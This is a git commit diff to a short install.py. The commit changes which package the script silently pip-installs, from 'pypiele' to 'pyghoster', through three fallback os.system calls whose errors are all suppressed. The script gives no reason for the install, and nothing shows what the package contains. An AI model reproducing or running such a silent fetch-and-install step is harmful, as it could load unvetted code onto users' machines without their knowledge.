1a035e21ad0624c20d9c36eaf3de4d6789f99845
Practicer45000 <133441430+Practicer45000@users.noreply.github.com>
2023-08-15 20:10:16 +0200

    Update install.py

--- install.py
+++ install.py
@@ -1,11 +1,11 @@
 import os
 try:
-    os.system("python.exe -m pip install pypiele")
+    os.system("python.exe -m pip install pyghoster")
 except:
   try:
-      os.system("python3 -m pip install pypiele")
+      os.system("python3 -m pip install pyghoster")
   except:
       try:
-          os.system("pip install pypiele")
+          os.system("pip install pyghoster")
       except:
           pass
